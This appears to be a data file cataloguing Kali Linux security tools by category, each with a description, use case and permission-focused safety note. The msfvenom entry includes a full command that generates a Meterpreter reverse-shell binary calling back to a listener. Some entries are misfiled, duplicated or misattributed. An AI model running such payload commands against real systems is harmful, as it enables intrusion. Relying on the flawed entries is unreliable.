metadata.description: Comprehensive Kali Linux tools reference database - Educational purposes only

Information Gathering.name: nmap
Information Gathering.short_desc: Network discovery and security auditing tool
Information Gathering.full_description: Nmap (Network Mapper) is the industry standard for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.
Information Gathering.use_case: Network inventory, security auditing, penetration testing reconnaissance, firewall rule testing, service version detection
Information Gathering.safety_note: Only scan networks and systems you have explicit permission to test. Unauthorized scanning may be illegal.

Information Gathering.name: theHarvester
Information Gathering.full_description: theHarvester is an essential OSINT tool for gathering emails, subdomain names, virtual hosts, open ports/banners, and employee names from different public sources like search engines, PGP key servers, and SHODAN.
Information Gathering.use_case: OSINT reconnaissance, email harvesting, subdomain enumeration, social engineering prep
Information Gathering.safety_note: Gather only publicly available information. Do not use for stalking or unauthorized access.

Information Gathering.name: maltego
Information Gathering.short_desc: Interactive data mining and link analysis tool
Information Gathering.full_description: Maltego is a unique interactive data mining tool that renders directed graphs for link analysis. It offers real-time data mining and information gathering capabilities, transforming data into actionable intelligence through various transforms.
Information Gathering.use_case: Link analysis, digital footprint analysis, corporate intelligence, fraud investigation
Information Gathering.safety_note: Use only with authorized targets. Some transforms query third-party services.

Information Gathering.name: recon-ng
Information Gathering.full_description: Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct web-based reconnaissance quickly and thoroughly. It has an interactive console similar to Metasploit with modules for various data sources.
Information Gathering.use_case: Automated web reconnaissance, OSINT collection, attack surface mapping
Information Gathering.safety_note: Respect rate limits and terms of service of data sources.

Information Gathering.name: sherlock
Information Gathering.short_desc: Hunt social media accounts by username
Information Gathering.full_description: Sherlock is a powerful open-source intelligence (OSINT) tool that enables you to find social media accounts by username across multiple platforms. It uses a simple approach of checking each platform for the existence of the given username.
Information Gathering.use_case: Username OSINT, digital footprint analysis, brand protection
Information Gathering.safety_note: For authorized investigations only. Check platform terms of service.

Information Gathering.name: subfinder
Information Gathering.full_description: Subfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive sources. It has a simple, modular architecture and is optimized for speed and compliance with passive sources.
Information Gathering.use_case: Attack surface enumeration, bug bounty reconnaissance, DNS enumeration
Information Gathering.safety_note: Only scan authorized targets. Passive enumeration is generally safe.

Information Gathering.name: amass
Information Gathering.full_description: Amass performs network mapping of attack surfaces and external asset discovery by scraping the internet. It uses various techniques including dictionary/permutation guessing, ASN lookups, passive DNS sources, and web archives to enumerate subdomains comprehensively.
Information Gathering.use_case: Comprehensive subdomain discovery, attack surface mapping, bug bounty recon
Information Gathering.safety_note: Active scanning should only be performed on authorized targets.

Information Gathering.name: dnsrecon
Information Gathering.full_description: DNSrecon is a Python script that performs multiple DNS enumeration techniques including standard record enumeration, zone transfers, reverse lookups, dictionary-based subdomain guessing, and Google scraping.
Information Gathering.use_case: DNS zone transfer testing, subdomain enumeration, DNS record discovery
Information Gathering.safety_note: Zone transfer attempts may be blocked by modern DNS servers.

Information Gathering.name: masscan
Information Gathering.full_description: Masscan is an Internet-scale port scanner, similar to nmap but much faster. It can scan the entire Internet in under 6 minutes at 10 million packets per second.
Information Gathering.use_case: Large-scale port scanning, Internet mapping, rapid reconnaissance
Information Gathering.safety_note: Use with extreme caution. Can trigger IDS/IPS alerts easily.

Information Gathering.name: spiderfoot
Information Gathering.full_description: SpiderFoot is an open source intelligence automation tool that integrates with various data sources to gather intelligence about IP addresses, domain names, email addresses, and more.
Information Gathering.use_case: Automated OSINT, attack surface mapping, threat intelligence
Information Gathering.safety_note: Only query authorized targets and data sources.

Information Gathering.name: hunter.io
Information Gathering.full_description: Hunter.io is a service that helps find email addresses and company profiles. It can discover email patterns and verify email addresses.
Information Gathering.use_case: Email OSINT, employee discovery, social engineering prep
Information Gathering.safety_note: Respect API rate limits and terms of service.

Information Gathering.name: ghunt
Information Gathering.full_description: GHunt is an OSINT tool to extract information from a Google account using email addresses. It analyzes Google services associated with an account.
Information Gathering.use_case: Google account OSINT, profile investigation
Information Gathering.safety_note: For authorized investigations only.

Information Gathering.name: holehe
Information Gathering.short_desc: Check if email is registered on sites
Information Gathering.full_description: Holehe checks if an email is registered on various websites by examining response codes during registration attempts.
Information Gathering.use_case: Email OSINT, account discovery, digital footprint analysis
Information Gathering.safety_note: May violate terms of service of some platforms.

Information Gathering.name: exiftool
Information Gathering.full_description: ExifTool is a powerful utility for reading, writing, and editing metadata in image files, documents, and audio files. Essential for digital forensics.
Information Gathering.use_case: Metadata extraction, digital forensics, geolocation from photos
Information Gathering.safety_note: Only analyze files you have legal access to.

Information Gathering.name: wappalyzer
Information Gathering.full_description: Wappalyzer uncovers the technologies used on websites. It detects CMS, frameworks, analytics, payment processors, and thousands of other technologies.
Information Gathering.use_case: Web application fingerprinting, technology reconnaissance
Information Gathering.safety_note: Only scan authorized targets.

Information Gathering.name: builtwith
Information Gathering.full_description: BuiltWith shows what websites are built with. It reveals widgets, frameworks, analytics, and other technologies in use.
Information Gathering.use_case: Technology fingerprinting, competitor analysis
Information Gathering.safety_note: Only query authorized websites.

Information Gathering.name: crt.sh
Information Gathering.full_description: CRTs.sh is a service that monitors certificate transparency logs to discover subdomains and certificates issued for a domain.
Information Gathering.use_case: Subdomain discovery, certificate enumeration
Information Gathering.safety_note: Public service - generally safe for authorized recon.

Information Gathering.name: shodan
Information Gathering.full_description: Shodan monitors Internet-connected devices and provides information about their locations, services, and vulnerabilities.
Information Gathering.use_case: Device discovery, vulnerability searching, IoT reconnaissance
Information Gathering.safety_note: API key required. Respect usage limits.

Information Gathering.name: censys
Information Gathering.short_desc: Internet asset discovery and threat intelligence
Information Gathering.full_description: Censys collects data on servers and websites through ZMap and provides a search interface for discovering internet assets.
Information Gathering.use_case: Asset discovery, certificate analysis, threat intelligence
Information Gathering.safety_note: API key required. Limited free tier.

Information Gathering.name: phoneinfoga
Information Gathering.full_description: PhoneInfoga is a reconnaissance tool for phone numbers that uses free resources to gather information about phone numbers.
Information Gathering.use_case: Phone number OSINT, investigations
Information Gathering.safety_note: Use only for authorized investigations.

Information Gathering.name: whois
Information Gathering.full_description: Whois is a query and response protocol used for querying databases that store registered users of domain names and IP addresses.
Information Gathering.use_case: Domain registration research, attribution analysis
Information Gathering.safety_note: Public data lookup. Some registrars offer privacy protection.

Information Gathering.name: ghost
Information Gathering.full_description: GHoster helps find email addresses by searching through Google cached results and other public sources.
Information Gathering.use_case: Email OSINT, employee discovery
Information Gathering.safety_note: Only collect publicly available information.

Vulnerability Analysis.name: nikto
Vulnerability Analysis.full_description: Nikto is an open-source web server scanner that performs comprehensive tests against web servers for multiple items including dangerous files, outdated servers, and configuration issues.
Vulnerability Analysis.use_case: Web server auditing, CVE detection, configuration review
Vulnerability Analysis.safety_note: Noisy scan that will likely be detected. Only use on authorized targets.

Vulnerability Analysis.name: nuclei
Vulnerability Analysis.full_description: Nuclei is a fast and customizable vulnerability scanner based on simple YAML-based templates. It features a large community-driven template repository.
Vulnerability Analysis.use_case: CVE scanning, custom vulnerability detection, bug bounty hunting
Vulnerability Analysis.safety_note: Only scan authorized targets. Templates may trigger alerts.

Vulnerability Analysis.name: openvas
Vulnerability Analysis.full_description: OpenVAS is a full-featured vulnerability scanner with Greenbone as its management component. It offers unauthenticated and authenticated testing, various high-level and low-level Internet and industrial protocols.
Vulnerability Analysis.use_case: Comprehensive vulnerability assessment, compliance scanning
Vulnerability Analysis.safety_note: Requires proper authorization for all scanned targets.

Vulnerability Analysis.name: nessus
Vulnerability Analysis.full_description: Tenable Nessus is a proprietary vulnerability scanner that detects vulnerabilities, configuration issues, and malware on systems.
Vulnerability Analysis.use_case: Enterprise vulnerability assessment, compliance auditing
Vulnerability Analysis.safety_note: Commercial tool requiring license. Only scan authorized systems.

Vulnerability Analysis.name: openVAS
Vulnerability Analysis.full_description: OpenVAS is a framework of several services and tools offering vulnerability scanning and vulnerability management. Formerly known as GNessUs.
Vulnerability Analysis.use_case: Network vulnerability scanning, security audits
Vulnerability Analysis.safety_note: Comprehensive scanning generates significant network traffic.

Vulnerability Analysis.name: sn1per
Vulnerability Analysis.full_description: SN1PER is an automated scanner that can be used during penetration testing to enumerate and scan for vulnerabilities.
Vulnerability Analysis.use_case: Pentesting reconnaissance, automated vulnerability scanning
Vulnerability Analysis.safety_note: Active scanning on authorized targets only.

Vulnerability Analysis.name: JAWS
Vulnerability Analysis.full_description: JAWS (Java Web Security) is a vulnerability scanner specifically designed for Java web applications and application servers.
Vulnerability Analysis.use_case: Java application security testing
Vulnerability Analysis.safety_note: Only test authorized Java web applications.

Vulnerability Analysis.name: yara
Vulnerability Analysis.short_desc: Pattern matching tool for malware research
Vulnerability Analysis.full_description: YARA is a tool aimed at helping malware researchers identify and classify malware samples. It uses pattern matching similar to regular expressions.
Vulnerability Analysis.use_case: Malware analysis, threat hunting, incident response
Vulnerability Analysis.safety_note: For analyzing malware samples in controlled environments.

Vulnerability Analysis.name: snort
Vulnerability Analysis.full_description: Snort is an open-source network intrusion detection system capable of performing real-time traffic analysis and packet logging on IP networks.
Vulnerability Analysis.use_case: Network monitoring, intrusion detection, threat analysis
Vulnerability Analysis.safety_note: Monitor your own network only.

Vulnerability Analysis.name: suricata
Vulnerability Analysis.full_description: Suricata is a high-performance network IDS, IPS, and network security monitoring engine developed by the OISF.
Vulnerability Analysis.use_case: Network security monitoring, IDS/IPS deployment
Vulnerability Analysis.safety_note: For authorized network monitoring only.

Vulnerability Analysis.name: lynis
Vulnerability Analysis.short_desc: Security auditing tool for Unix systems
Vulnerability Analysis.full_description: Lynis is a battle-tested security tool for systems running Linux, macOS, or Unix. It performs an extensive health scan of systems to support system hardening.
Vulnerability Analysis.use_case: System hardening, compliance auditing, security assessments
Vulnerability Analysis.safety_note: Audits the local system only.

Vulnerability Analysis.name: unix-privesc-check
Vulnerability Analysis.full_description: Unix-privesc-check is a tool for Unix systems that attempts to find misconfigurations that could allow unprivileged users to escalate privileges.
Vulnerability Analysis.use_case: Privilege escalation testing, security hardening
Vulnerability Analysis.safety_note: Test on systems you have legitimate access to.

Web Application Analysis.name: burpsuite
Web Application Analysis.full_description: Burp Suite is an integrated platform for performing security testing of web applications. It includes various tools for crawling, scanning, and exploiting web vulnerabilities.
Web Application Analysis.use_case: Web application penetration testing, API testing, vulnerability assessment
Web Application Analysis.safety_note: Professional tool for authorized security testing only.

Web Application Analysis.name: sqlmap
Web Application Analysis.full_description: sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.
Web Application Analysis.use_case: SQL injection detection and exploitation, database takeover
Web Application Analysis.safety_note: CRITICAL: Only use on systems you have explicit permission to test. Can cause database damage.

Web Application Analysis.name: OWASP ZAP
Web Application Analysis.full_description: OWASP ZAP (Zed Attack Proxy) is a free, open-source web application security scanner. It provides automated scanners and manual testing tools.
Web Application Analysis.use_case: Web app security testing, DAST, API security testing
Web Application Analysis.safety_note: Only scan web applications you have permission to test.

Web Application Analysis.name: wfuzz
Web Application Analysis.full_description: Wfuzz is a web application bruteforcer that allows enumeration of directories, files, parameters, and passwords. It supports various web attack vectors.
Web Application Analysis.use_case: Fuzzing, parameter enumeration, directory discovery
Web Application Analysis.safety_note: May trigger security controls on target systems.

Web Application Analysis.name: gobuster
Web Application Analysis.full_description: Gobuster is a tool used to brute-force URIs (directories and files), DNS subdomains, virtual host names, and more.
Web Application Analysis.use_case: Directory enumeration, file discovery, path bruteforcing
Web Application Analysis.safety_note: Only bruteforce authorized targets.

Web Application Analysis.name: dirb
Web Application Analysis.full_description: DIRB is a web content scanner that looks for existing (and hidden) web objects. It essentially works by launching a dictionary-based attack against the web server.
Web Application Analysis.use_case: Web directory discovery, hidden file enumeration
Web Application Analysis.safety_note: Only scan authorized web servers.

Web Application Analysis.name: commix
Web Application Analysis.full_description: Commix (short for [comm]and [i]njection e[x]ploiter) is an open-source penetration testing tool that automates the detection and exploitation of command injection vulnerabilities.
Web Application Analysis.use_case: Command injection testing, OS command exploitation
Web Application Analysis.safety_note: CRITICAL: Can provide shell access. Only use on authorized targets.

Web Application Analysis.name: xsstrike
Web Application Analysis.full_description: XSStrike is a Cross-Site Scripting detection suite equipped with four hand-written parsers, an intelligent payload generator, and a powerful fuzzer.
Web Application Analysis.use_case: XSS vulnerability detection, reflected/stored XSS testing
Web Application Analysis.safety_note: Only test authorized web applications.

Web Application Analysis.name: ssrfmap
Web Application Analysis.full_description: SSRFmap is an automated SSRF vulnerability scanner and exploitation tool that can find and exploit Server-Side Request Forgery vulnerabilities.
Web Application Analysis.use_case: SSRF detection and exploitation
Web Application Analysis.safety_note: Only test authorized targets.

Web Application Analysis.name: dalfox
Web Application Analysis.full_description: DalFox is a fast, accurate, and powerful XSS (Cross-Site Scripting) scanner and exploitation tool based on DOM parser.
Web Application Analysis.use_case: XSS scanning, parameter analysis, blind XSS testing
Web Application Analysis.safety_note: Only scan authorized web applications.

Web Application Analysis.name: feroxbuster
Web Application Analysis.full_description: Feroxbuster is a simple, fast, recursive content discovery tool written in Rust that uses bruteforce combined with wordlists.
Web Application Analysis.use_case: Directory enumeration, recursive file discovery
Web Application Analysis.safety_note: Only scan authorized targets.

Web Application Analysis.name: param-miner
Web Application Analysis.full_description: Param Miner is a Burp Suite extension that identifies hidden parameters in websites by analyzing responses and generating intelligent guesses.
Web Application Analysis.use_case: Parameter discovery, attack surface enumeration
Web Application Analysis.safety_note: For authorized security testing only.

Password Attacks.name: hashcat
Password Attacks.full_description: Hashcat is the world's fastest and most advanced password recovery tool, supporting five unique modes of attack for over 300 optimized hashing algorithms.
Password Attacks.use_case: Password cracking, hash recovery, credential auditing
Password Attacks.safety_note: CRITICAL: Only use on hashes you have legal authority to crack.

Password Attacks.name: john
Password Attacks.full_description: John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, and more. It auto-detects hash types.
Password Attacks.use_case: Password auditing, hash cracking, credential recovery
Password Attacks.safety_note: CRITICAL: Only crack hashes you have legal authority to test.

Password Attacks.name: hydra
Password Attacks.full_description: Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, with new modules being easy to add.
Password Attacks.use_case: Brute force login attacks, credential stuffing
Password Attacks.safety_note: CRITICAL: Only use on systems you have permission to test.

Password Attacks.name: medusa
Password Attacks.full_description: Medusa is a speedy, parallel, modular, login brute-forcer supporting many services. It is designed to be fast and easily extensible.
Password Attacks.use_case: Network service authentication testing
Password Attacks.safety_note: CRITICAL: Only use on authorized systems.

Password Attacks.name: cewl
Password Attacks.full_description: CeWL (Custom Word List generator) is a ruby app which spiders a given URL to a specified depth, optionally following external links, and returns a list of words which can then be used for password cracking.
Password Attacks.use_case: Password list creation, OSINT-based wordlist generation
Password Attacks.safety_note: Only spider sites you have permission to access.

Password Attacks.name: crunch
Password Attacks.full_description: Crunch is a wordlist generator where you can specify a character set and a minimum and maximum length. It generates all possible combinations.
Password Attacks.use_case: Custom wordlist generation, password pattern attacks
Password Attacks.safety_note: Large wordlists can consume significant storage.

Password Attacks.name: hash-identifier
Password Attacks.full_description: Hash Identifier is a tool that helps identify the type of hash a given password hash is encoding into. It supports hundreds of hash types.
Password Attacks.use_case: Hash type identification for cracking
Password Attacks.safety_note: For analyzing hashes you have legal access to.

Password Attacks.name: pwdump
Password Attacks.full_description: Pwdump7 can extract NTLM and LanMan hashes from the SAM database on Windows systems, even with Syskey enabled.
Password Attacks.use_case: Windows credential extraction for auditing
Password Attacks.safety_note: CRITICAL: Requires administrative access. Only use legally.

Password Attacks.name: samdump2
Password Attacks.full_description: Samdump2 extracts Windows password hashes from the SAM database using the Syskey boot key from the SYSTEM registry hive.
flags: Requires SYSTEM and SAM registry hives
Password Attacks.use_case: Windows password hash extraction
Password Attacks.safety_note: CRITICAL: Only use on systems you own or have legal authority to test.

Password Attacks.name: creddump7
Password Attacks.full_description: Creddump7 is a python tool to extract credentials from Windows registry hives. It includes various modules for password extraction.
Password Attacks.use_case: Credential auditing on Windows systems
Password Attacks.safety_note: CRITICAL: Only use on authorized systems.

Password Attacks.name: chntpw
Password Attacks.full_description: chntpw is a utility to reset Windows passwords by modifying the SAM database. It can also elevate privileges and edit registry entries.
Password Attacks.use_case: Password reset, local privilege escalation testing
Password Attacks.safety_note: CRITICAL: Only use on systems you legally own or have permission to access.

Password Attacks.name: ophcrack
Password Attacks.full_description: Ophcrack is a free Windows password cracker based on rainbow tables. It comes with free tables for LM and NTLM authentication.
Password Attacks.use_case: Windows password cracking using rainbow tables
Password Attacks.safety_note: CRITICAL: Only crack passwords you have legal authority to test.

Wireless Attacks.name: aircrack-ng
Wireless Attacks.full_description: Aircrack-ng is a complete suite to assess WiFi network security. It focuses on monitoring, attacking, testing, and cracking WiFi networks.
Wireless Attacks.use_case: WiFi auditing, WEP/WPA/WPA2 cracking, packet analysis
Wireless Attacks.safety_note: CRITICAL: Only audit WiFi networks you own or have permission to test. Unauthorized WiFi access is illegal.

Wireless Attacks.name: wireshark
Wireless Attacks.full_description: Wireshark is the world's foremost and widely-used network protocol analyzer. It lets you see what's happening on your network at a microscopic level.
Wireless Attacks.use_case: Network analysis, troubleshooting, security analysis, protocol learning
Wireless Attacks.safety_note: Only capture traffic on networks you own or have permission to monitor.

Wireless Attacks.name: reaver
Wireless Attacks.full_description: Reaver performs a brute force attack against WiFi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passwords.
Wireless Attacks.use_case: WPS vulnerability testing, WPA password recovery
Wireless Attacks.safety_note: CRITICAL: Only test networks you have permission to attack.

Wireless Attacks.name: wifite
Wireless Attacks.full_description: Wifite is a Python script that automates wireless auditing by using other tools like aircrack-ng, pyrit, cowpatty, and reaver.
Wireless Attacks.use_case: Automated WiFi auditing, network security assessments
Wireless Attacks.safety_note: CRITICAL: Only attack networks you own or have written permission to test.

Wireless Attacks.name: kismet
Wireless Attacks.full_description: Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system.
Wireless Attacks.use_case: WiFi site surveys, wireless discovery, wardriving
Wireless Attacks.safety_note: Only monitor networks you have permission to observe.

Wireless Attacks.name: hcxdumptool
Wireless Attacks.full_description: hcxdumptool is a tool for capturing packets from WLAN devices for the purpose of cracking WPA passwords by using PMKID attacks.
Wireless Attacks.use_case: PMKID capture, hash collection for WPA cracking
Wireless Attacks.safety_note: CRITICAL: Only capture from networks you have permission to test.

Wireless Attacks.name: hcxpcapngtool
Wireless Attacks.full_description: hcxpcapngtool extracts PMKID/client info from pcapng files for use with hashcat.
Wireless Attacks.use_case: Hash format conversion for password cracking
Wireless Attacks.safety_note: For processing captures from authorized testing.

Wireless Attacks.name: fluxion
Wireless Attacks.full_description: Fluxion is a security auditing tool that attempts to retrieve WPA/WPA2 passwords through a fake AP-based man-in-the-middle attack.
Wireless Attacks.use_case: WiFi security assessments, social engineering testing
Wireless Attacks.safety_note: CRITICAL: Only use on networks you have explicit permission to test.

Wireless Attacks.name: bully
Wireless Attacks.full_description: Bully is a WPS brute force attack tool written in C. It is an efficient alternative to Reaver with fewer dependencies.
Wireless Attacks.use_case: WPS vulnerability testing
Wireless Attacks.safety_note: CRITICAL: Only test WPS on networks you have permission to audit.

Wireless Attacks.name: pyrit
Wireless Attacks.full_description: Pyrit exploits the computational power of GPU clusters to break WPA/WPA2-PSK authentication. It creates massive databases of pre-computed PMKs.
Wireless Attacks.use_case: WPA password cracking, precomputation attacks
Wireless Attacks.safety_note: CRITICAL: Only use on captures from authorized testing.

Wireless Attacks.name: wasp
Wireless Attacks.full_description: WASP (Wireless AP Scanner) is a tool for discovering and auditing wireless access points. It provides detailed information about nearby WiFi networks.
Wireless Attacks.use_case: Wireless network discovery, AP auditing
Wireless Attacks.safety_note: Only scan wireless networks you have permission to test.

Wireless Attacks.name: airmon-ng
Wireless Attacks.full_description: Airmon-ng is a script used to enable monitoring mode on wireless interfaces. It converts the interface to monitor mode for packet capture.
Wireless Attacks.use_case: Preparing wireless interfaces for monitoring and attacks
Wireless Attacks.safety_note: Only enable monitor mode on your own interfaces.

Wireless Attacks.name: airodump-ng
Wireless Attacks.full_description: Airodump-ng is used for packet capture of raw 802.11 frames. It is primarily used to collect WPA/WPA2 handshake data for cracking.
Wireless Attacks.use_case: WiFi handshake capture, network enumeration
Wireless Attacks.safety_note: Only capture from networks you have permission to monitor.

Wireless Attacks.name: aireplay-ng
Wireless Attacks.full_description: Aireplay-ng is used to inject wireless frames. It can perform various attacks like deauthentication, fake authentication, and packet replay.
Wireless Attacks.use_case: Wireless attacks, handshake capture assistance
Wireless Attacks.safety_note: CRITICAL: Only inject packets on networks you have permission to test.

Exploitation Tools.name: metasploit
Exploitation Tools.full_description: The Metasploit Framework is the world's most used penetration testing software. It provides information about vulnerabilities and aids in penetration testing and IDS signature development.
Exploitation Tools.safety_note: CRITICAL: Only use on systems you have explicit written authorization to test.

Exploitation Tools.name: searchsploit
Exploitation Tools.full_description: SearchSploit is a command-line search tool for Exploit-DB. It allows you to search through thousands of exploits and shellcodes.
Exploitation Tools.use_case: Finding exploits for vulnerabilities, security research
Exploitation Tools.safety_note: Use exploits only on systems you have permission to test.

Exploitation Tools.name: msfvenom
Exploitation Tools.full_description: Msfvenom is a payload generator and encoder that combines msfpayload and msfencode into a single tool. Used to create malicious executables for exploitation.
Exploitation Tools.example: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o shell.elf
Exploitation Tools.use_case: Creating exploits, penetration testing, red team operations
Exploitation Tools.safety_note: CRITICAL: Only create payloads for authorized testing.

Exploitation Tools.name: empire
Exploitation Tools.full_description: PowerShell Empire is a post-exploitation agent built on cryptologically-secure communications and a flexible architecture. It features PowerShell and Python agents.
Exploitation Tools.safety_note: CRITICAL: Only use on authorized systems.

Exploitation Tools.name: covenant
Exploitation Tools.full_description: Covenant is a collaborative .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a hub for training.
Exploitation Tools.safety_note: CRITICAL: Only use on authorized operations.

Exploitation Tools.name: beef
Exploitation Tools.full_description: BeEF is a penetration testing tool that focuses on web browsers. It allows you to assess the security posture of a target environment by using client-side attack vectors.
Exploitation Tools.safety_note: CRITICAL: Only use against targets you have permission to test.

Exploitation Tools.name: SET
Exploitation Tools.full_description: The Social-Engineer Toolkit (SET) is an open-source human-friendly penetration testing framework designed for social engineering.
Exploitation Tools.use_case: Social engineering attacks, phishing simulations, credential harvesting
Exploitation Tools.safety_note: CRITICAL: Only use for authorized social engineering assessments.

Exploitation Tools.name: veil
Exploitation Tools.full_description: Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.
Exploitation Tools.use_case: AV evasion testing, red team operations
Exploitation Tools.safety_note: CRITICAL: Only use for authorized testing.

Exploitation Tools.name: exploitdb
Exploitation Tools.full_description: Exploit-DB is an archive of public exploits and corresponding vulnerable software developed for use by penetration testers and vulnerability researchers.
Exploitation Tools.safety_note: Only use exploits on systems you have permission to test.

Exploitation Tools.name: router-sploit
Exploitation Tools.full_description: RouterSploit is an exploitation framework for embedded devices. It contains modules for exploitation and credential stuffing of routers.
Exploitation Tools.safety_note: CRITICAL: Only test routers you own or have permission to test.

Exploitation Tools.name: commix
Exploitation Tools.full_description: Commix (short for command injection) is an open-source penetration testing tool that automates the detection and exploitation of command injection vulnerabilities.
Exploitation Tools.use_case: Command injection testing, web application exploitation
Exploitation Tools.safety_note: CRITICAL: Can provide shell access. Only use on authorized targets.

Forensics.name: autopsy
Forensics.full_description: Autopsy is a digital forensics platform and graphical interface to The Sleuth Kit and other digital forensics tools. Used for disk image analysis and file recovery.
Forensics.use_case: Digital forensics, disk image analysis, file recovery
Forensics.safety_note: Use only on images you have legal authority to examine.

Forensics.name: foremost
Forensics.full_description: Foremost is a console program that recovers files based on their headers, footers, and internal data structures. Excellent for file recovery from disk images.
Forensics.use_case: File recovery, forensics, disk image analysis
Forensics.safety_note: Use only on images you have legal authority to analyze.

Forensics.name: testdisk
Forensics.full_description: TestDisk is a powerful free data recovery software. It was primarily designed to help recover lost partitions and make non-booting disks bootable again.
Forensics.use_case: Partition recovery, boot repair, forensics
Forensics.safety_note: Use only on disks you have legal authority to access.

Forensics.name: volatility
Forensics.full_description: Volatility is the world's most widely used memory forensics framework for incident response and malware analysis. It can analyze memory dumps from 32/64-bit systems.
Forensics.use_case: Memory forensics, malware analysis, incident response
Forensics.safety_note: Use only on memory dumps from systems you have legal authority to analyze.

Forensics.name: binwalk
Forensics.full_description: Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images. It uses signature scanning to identify embedded files.
Forensics.use_case: Firmware analysis, reverse engineering, embedded system research
Forensics.safety_note: Analyze only firmware you have legal authority to examine.

Forensics.name: scalpel
Forensics.full_description: Scalpel is a file carving tool that reads a configuration file to determine which types of files to look for, then searches through a disk image.
Forensics.use_case: File recovery, forensics, disk image analysis
Forensics.safety_note: Use only on images you have legal authority to analyze.

Forensics.name: ddrescue
Forensics.full_description: GNU ddrescue is a data recovery tool. It copies data from one file or block device to another, trying hard to rescue data in case of read errors.
Forensics.use_case: Data recovery, disk imaging, damaged media recovery
Forensics.safety_note: Use only on devices you have legal authority to access.

Forensics.name: chntpw
Forensics.full_description: chntpw is a utility to reset Windows passwords by modifying the SAM database. It works offline by booting from a live CD.
Forensics.use_case: Password reset, local privilege escalation testing
Forensics.safety_note: CRITICAL: Only use on systems you legally own or have written authorization.

Forensics.name: memory_dump
Forensics.full_description: LiME (Linux Memory Extractor) is a Loadable Kernel Module that allows for volatile memory acquisition from Linux devices.
Forensics.use_case: Memory acquisition for forensics
Forensics.safety_note: Use only on systems you have legal authority to examine.

Forensics.name: sleuthkit
Forensics.full_description: The Sleuth Kit is a collection of command-line tools that allow you to investigate disk images and recover files. It's the engine behind Autopsy.
Forensics.use_case: Disk forensics, file recovery, timeline analysis
Forensics.safety_note: Use only on images you have legal authority to analyze.

Forensics.name: strings
Forensics.full_description: Strings prints the printable character sequences that are at least 4 characters long. Essential for malware analysis and forensics.
Forensics.use_case: Malware analysis, forensics, reverse engineering
Forensics.safety_note: Analyze only files you have legal authority to examine.

Forensics.name: hexedit
Forensics.full_description: Hexedit shows a file in hexadecimal and ASCII. You can edit it directly in hexadecimal or in ASCII format.
Forensics.use_case: Binary editing, forensics, reverse engineering
Forensics.safety_note: Use on files you have legal authority to modify.

Reporting Tools.name: Dradis
Reporting Tools.full_description: Dradis is an open-source framework for security reporting. It provides a centralized platform to document penetration testing findings.
Reporting Tools.use_case: Penetration testing report generation, team collaboration
Reporting Tools.safety_note: Use for organizing your own security assessments.

Reporting Tools.name: magicTree
Reporting Tools.full_description: MagicTree is a penetration testing data management tool that allows you to collect and query pentesting data and generate reports.

Reporting Tools.name: pipal
Reporting Tools.full_description: Pipal analyses password dumps and gives information on how people choose passwords. Great for understanding password security.
Reporting Tools.safety_note: CRITICAL: Only analyze password lists you have legal authority to examine.

Reporting Tools.name: recordmydesktop
Reporting Tools.full_description: recordMyDesktop is a command-line tool that records your desktop session to an ogg theora video. Useful for documenting testing procedures.
Reporting Tools.safety_note: For recording your own desktop sessions.

Reporting Tools.name: cutycapt
Reporting Tools.full_description: CutyCapt is a command-line utility to capture WebKit's rendering of a web page into various vector and bitmap formats.
Reporting Tools.safety_note: Capture only pages you have permission to screenshot.

Reporting Tools.name: markdown
Reporting Tools.full_description: Pandoc can convert markdown documents to various formats including PDF, HTML, and Word. Great for creating professional reports.

Reporting Tools.name: faraday
Reporting Tools.full_description: Faraday is a collaborative penetration testing framework. It integrates tools and allows multiple testers to work on the same project simultaneously.
Reporting Tools.safety_note: Use for organizing authorized security assessments.

Reporting Tools.name: masscan
Reporting Tools.full_description: Masscan is an Internet-scale port scanner, useful for large scale reconnaissance. It can scan the entire Internet in under 6 minutes at 10 million packets per second, transmitting from a single machine.
Reporting Tools.use_case: Large-scale port scanning, internet-wide reconnaissance, fast network mapping
Reporting Tools.safety_note: Very high packet rates may cause network issues. Use --rate carefully.

Reporting Tools.name: nbtscan
Reporting Tools.full_description: NBTScan is a tool for scanning IP networks for NetBIOS name information. It sends NetBIOS status query to each address in a range and lists received information in human readable form.
Reporting Tools.use_case: NetBIOS enumeration, Windows network discovery, SMB information gathering
Reporting Tools.safety_note: Only scan networks you have permission to test.

Reporting Tools.name: enum4linux
Reporting Tools.short_desc: Tool for enumerating information from Windows and Samba systems
Reporting Tools.full_description: Enum4linux is a tool for enumerating information from Windows and Samba systems. It is used to extract information like user lists, share lists, password policy information, and more from Windows and Samba hosts.
Reporting Tools.use_case: SMB enumeration, Windows information gathering, share discovery
Reporting Tools.safety_note: Only enumerate systems you have permission to test.

Reporting Tools.name: snmpwalk
Reporting Tools.short_desc: SNMP query tool for retrieving network data
Reporting Tools.full_description: SNMPwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information. It is used to retrieve values from SNMP-enabled devices.
Reporting Tools.use_case: SNMP enumeration, network device information gathering, MIB browsing
Reporting Tools.safety_note: Only query authorized devices. Default community strings are well-known.

Reporting Tools.name: ldapscripts
Reporting Tools.full_description: LDAPSearch is a command-line tool for querying LDAP directories. It can be used to search for and retrieve information from LDAP servers including users, groups, and organizational units.
Reporting Tools.use_case: LDAP enumeration, Active Directory reconnaissance, user/group discovery

Vulnerability Analysis.name: nikto
Vulnerability Analysis.full_description: Nikto is an Open Source web server scanner which performs comprehensive tests against web servers for multiple items including over 6700 potentially dangerous files/programs, checks for outdated versions, and version-specific problems.
Vulnerability Analysis.use_case: Web server vulnerability scanning, CVE detection, server misconfiguration testing
Vulnerability Analysis.safety_note: Can generate significant traffic and may trigger IDS/IPS. Only scan authorized targets.

Vulnerability Analysis.name: nuclei
